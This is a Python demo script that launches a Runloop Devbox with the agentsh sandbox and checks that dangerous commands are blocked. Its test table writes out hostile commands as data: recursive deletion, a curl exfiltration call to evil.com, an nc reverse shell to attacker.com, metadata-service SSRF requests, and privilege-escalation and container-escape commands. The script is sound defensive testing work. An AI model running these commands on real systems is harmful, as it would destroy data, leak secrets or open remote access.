#!/usr/bin/env python3
"""
agentsh + Runloop Security Demo

This script demonstrates the security features of agentsh running in a Runloop Devbox.
It creates a Blueprint with agentsh installed, launches a Devbox, and runs comprehensive
security tests covering AI agent protection, cloud infrastructure security, and
multi-tenant isolation.

Prerequisites:
    pip install runloop-api-client

Usage:
    export RUNLOOP_API_KEY="your-api-key"
    python example.py
"""

import asyncio
import os
import sys
from pathlib import Path

# =============================================================================
# SECURITY TEST DEFINITIONS
# =============================================================================

SECURITY_TESTS = {
    # =========================================================================
    # A. AI AGENT CODE EXECUTION PROTECTION
    # =========================================================================
    "ai_agent": {
        "title": "AI Agent Code Execution Protection",
        "description": "Protect against malicious AI-generated code, prompt injection, and hallucinations",
        "tests": [
            {
                "name": "Block recursive rm (AI hallucination)",
                "command": "rm -rf /home 2>&1",
                "expect": "blocked",
                "description": "AI agent attempting destructive command",
            },
            {
                "name": "Block data exfiltration",
                "command": "curl -s https://evil.com/exfil 2>&1",
                "expect": "blocked",
                "description": "Prompt injection leading to data exfiltration",
            },
            {
                "name": "Block reverse shell (nc)",
                "command": "nc -e /bin/bash attacker.com 4444 2>&1",
                "expect": "blocked",
                "description": "Malicious code attempting reverse shell",
            },
            {
                "name": "Soft-delete protection",
                "command": "touch /tmp/testfile && rm /tmp/testfile 2>&1; echo 'delete attempted'",
                "expect": "success",
                "description": "Single file deletes allowed (soft-delete in workspace)",
            },
        ],
    },

    # =========================================================================
    # B. CLOUD/INFRASTRUCTURE PROTECTION
    # =========================================================================
    "cloud_infra": {
        "title": "Cloud Infrastructure Protection",
        "description": "Prevent SSRF, credential theft, and lateral movement in cloud environments",
        "tests": [
            {
                "name": "Block AWS metadata service",
                "command": "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>&1",
                "expect": "blocked",
                "description": "Prevent SSRF to AWS instance metadata",
            },
            {
                "name": "Block GCP metadata service",
                "command": "curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/ 2>&1",
                "expect": "blocked",
                "description": "Prevent SSRF to GCP instance metadata",
            },
            {
                "name": "Block internal network (10.x.x.x)",
                "command": "curl -s --connect-timeout 2 http://10.0.0.1:8080/ 2>&1",
                "expect": "blocked",
                "description": "Prevent lateral movement to internal services",
            },
            {
                "name": "Block internal network (172.16.x.x)",
                "command": "curl -s --connect-timeout 2 http://172.16.0.1/ 2>&1",
                "expect": "blocked",
                "description": "Prevent lateral movement to private network",
            },
            {
                "name": "Block Kubernetes API",
                "command": "curl -sk --connect-timeout 2 https://kubernetes.default.svc/ 2>&1",
                "expect": "blocked",
                "description": "Prevent access to K8s control plane",
            },
        ],
    },

    # =========================================================================
    # C. MULTI-TENANT / DEVBOX ISOLATION
    # =========================================================================
    "isolation": {
        "title": "Multi-Tenant Isolation",
        "description": "Prevent container escape, privilege escalation, and resource abuse",
        "tests": [
            {
                "name": "Block sudo",
                "command": "sudo whoami 2>&1",
                "expect": "blocked",
                "description": "Prevent privilege escalation via sudo",
            },
            {
                "name": "Block su",
                "command": "su - root -c whoami 2>&1",
                "expect": "blocked",
                "description": "Prevent privilege escalation via su",
            },
            {
                "name": "Block nsenter (container escape)",
                "command": "nsenter --target 1 --mount 2>&1",
                "expect": "blocked",
                "description": "Prevent escape to host namespace",
            },
            {
                "name": "Block docker command",
                "command": "docker ps 2>&1",
                "expect": "blocked",
                "description": "Prevent Docker-in-Docker abuse",
            },
            {
                "name": "Block pkill (process control)",
                "command": "pkill -9 bash 2>&1",
                "expect": "blocked",
                "description": "Prevent killing processes",
            },
        ],
    },

    # =========================================================================
    # ALLOWED OPERATIONS (sanity checks)
    # =========================================================================
    "allowed": {
        "title": "Allowed Operations",
        "description": "Verify normal development operations work correctly",
        "tests": [
            {
                "name": "Basic echo",
                "command": "echo 'Hello from agentsh sandbox'",
                "expect": "success",
                "description": "Basic shell command",
            },
            {
                "name": "List files",
                "command": "ls -la /home",
                "expect": "success",
                "description": "File listing",
            },
            {
                "name": "Git version",
                "command": "git --version",
                "expect": "success",
                "description": "Git operations",
            },
            {
                "name": "Bash execution",
                "command": "bash -c 'echo $((1+1))'",
                "expect": "success",
                "description": "Bash code execution",
            },
            {
                "name": "npm registry access",
                "command": "curl -sI https://registry.npmjs.org/ 2>&1 | head -1",
                "expect": "success",
                "description": "Package registry access (allowed)",
            },
            {
                "name": "agentsh version",
                "command": "/usr/bin/agentsh --version",
                "expect": "success",
                "description": "agentsh is installed",
            },
        ],
    },
}


async def main():
    # Check for API key
    if not os.environ.get("RUNLOOP_API_KEY"):
        print("Error: RUNLOOP_API_KEY environment variable not set")
        print("Get your API key from https://app.runloop.ai")
        sys.exit(1)

    try:
        from runloop_api_client import AsyncRunloop
    except ImportError:
        print("Error: runloop-api-client not installed")
        print("Run: pip install runloop-api-client")
        sys.exit(1)

    print("=" * 70)
    print("  agentsh + Runloop Security Demo")
    print("=" * 70)

    # Read configuration files
    script_dir = Path(__file__).parent
    dockerfile = (script_dir / "Dockerfile").read_text()
    default_yaml = (script_dir / "default.yaml").read_text()
    config_yaml = (script_dir / "config.yaml").read_text()

    # Initialize Runloop client
    runloop = AsyncRunloop()

    # -------------------------------------------------------------------------
    # Step 1: Create Blueprint
    # -------------------------------------------------------------------------
    print("\n[1] Creating Blueprint with agentsh...")
    print("    This may take a few minutes on first run (building image)")

    blueprint = await runloop.blueprints.create(
        name="agentsh-sandbox",
        dockerfile=dockerfile,
        file_mounts={
            # Mount to /tmp during build (user-writable), copy to /etc at runtime
            "/tmp/agentsh-config/default.yaml": default_yaml,
            "/tmp/agentsh-config/config.yaml": config_yaml,
        },
        launch_parameters={
            # Copy config files and install shell shim at runtime (with sudo)
            "launch_commands": [
                "sudo cp /tmp/agentsh-config/config.yaml /etc/agentsh/config.yaml",
                "sudo cp /tmp/agentsh-config/default.yaml /etc/agentsh/policies/default.yaml",
                "sudo agentsh shim install-shell --root / --shim /usr/bin/agentsh-shell-shim --bash --i-understand-this-modifies-the-host",
            ],
        },
    )
    print(f"    Blueprint ID: {blueprint.id}")

    # Wait for blueprint build to complete
    print("    Waiting for build to complete...")
    while True:
        info = await runloop.blueprints.retrieve(blueprint.id)
        status = info.status
        print(f"    Status: {status}")

        if status == "build_complete":
            print("    Blueprint build complete!")
            break
        elif status == "build_failed":
            # Try to get build logs
            try:
                logs = await runloop.blueprints.logs(blueprint.id)
                print(f"    Build logs: {logs}")
            except Exception:
                pass
            raise Exception("Blueprint build failed")

        await asyncio.sleep(5)

    # -------------------------------------------------------------------------
    # Step 2: Create Devbox from Blueprint
    # -------------------------------------------------------------------------
    print("\n[2] Creating Devbox from Blueprint...")

    devbox = await runloop.devboxes.create(blueprint_id=blueprint.id)
    print(f"    Devbox ID: {devbox.id}")

    # Wait for devbox to be running
    print("    Waiting for Devbox to be ready...")
    while True:
        info = await runloop.devboxes.retrieve(devbox.id)
        status = info.status

        if status == "running":
            print("    Devbox is running!")
            break
        elif status in ("failed", "shutdown"):
            raise Exception(f"Devbox failed to start: {status}")

        await asyncio.sleep(2)

    # Wait for agentsh daemon to initialize
    print("    Waiting for agentsh daemon to initialize...")
    await asyncio.sleep(10)

    # -------------------------------------------------------------------------
    # Step 3: Run Security Tests
    # -------------------------------------------------------------------------
    try:
        results = {"passed": 0, "failed": 0, "errors": 0}

        for category_key, category in SECURITY_TESTS.items():
            print(f"\n{'=' * 70}")
            print(f"  {category['title']}")
            print(f"  {category['description']}")
            print("=" * 70)

            for test in category["tests"]:
                print(f"\n[TEST] {test['name']}")
                print(f"       {test['description']}")
                print(f"       Command: {test['command'][:60]}{'...' if len(test['command']) > 60 else ''}")

                try:
                    result = await runloop.devboxes.execute_sync(
                        id=devbox.id,
                        command=test["command"],
                        timeout=30,
                    )

                    stdout = result.stdout or ""
                    stderr = result.stderr or ""
                    output = (stdout + stderr).strip()

                    # Truncate long output
                    if len(output) > 200:
                        output = output[:200] + "..."

                    exit_code = result.exit_status

                    # Determine if test passed based on expectation
                    if test["expect"] == "blocked":
                        # For blocked tests, we expect non-zero exit or error message
                        passed = (
                            exit_code != 0
                            or "blocked" in output.lower()
                            or "denied" in output.lower()
                            or "permission" in output.lower()
                            or "400" in output
                            or "not found" in output.lower()
                        )
                    elif test["expect"] == "success":
                        passed = exit_code == 0
                    else:
                        passed = True

                    status = "PASS" if passed else "FAIL"
                    results["passed" if passed else "failed"] += 1

                    print(f"       Output: {output if output else '(no output)'}")
                    print(f"       Exit code: {exit_code}")
                    print(f"       Result: [{status}]")

                except asyncio.TimeoutError:
                    print("       Error: Command timed out")
                    print("       Result: [ERROR]")
                    results["errors"] += 1
                except Exception as e:
                    print(f"       Error: {e}")
                    print("       Result: [ERROR]")
                    results["errors"] += 1

        # -------------------------------------------------------------------------
        # Summary
        # -------------------------------------------------------------------------
        print("\n" + "=" * 70)
        print("  SUMMARY")
        print("=" * 70)
        print(f"""
    Tests passed: {results['passed']}
    Tests failed: {results['failed']}
    Errors:       {results['errors']}

    Security features demonstrated:

    AI AGENT PROTECTION:
      - Recursive delete (rm -rf) blocked
      - Reverse shell attempts blocked
      - Data exfiltration to evil.com blocked

    CLOUD INFRASTRUCTURE:
      - AWS/GCP metadata service blocked (SSRF prevention)
      - Internal network access blocked (lateral movement prevention)
      - Kubernetes API blocked

    MULTI-TENANT ISOLATION:
      - sudo/su blocked (privilege escalation prevention)
      - nsenter blocked (container escape prevention)
      - docker command blocked (DinD abuse prevention)
      - kill command blocked (system stability)

    HOW IT WORKS:
      1. /bin/bash replaced with agentsh-shell-shim
      2. All commands routed through agentsh policy engine
      3. HTTPS_PROXY set to agentsh proxy for network filtering
      4. Policy rules (default.yaml) enforce allow/deny/approve decisions
""")

    finally:
        # -------------------------------------------------------------------------
        # Cleanup
        # -------------------------------------------------------------------------
        print("\n[CLEANUP] Shutting down Devbox...")
        await runloop.devboxes.shutdown(devbox.id)
        print(f"    Devbox {devbox.id} shut down.")

        # Optionally delete the blueprint
        # print("[CLEANUP] Deleting Blueprint...")
        # await runloop.blueprints.delete(blueprint.id)
        # print(f"    Blueprint {blueprint.id} deleted.")


if __name__ == "__main__":
    asyncio.run(main())
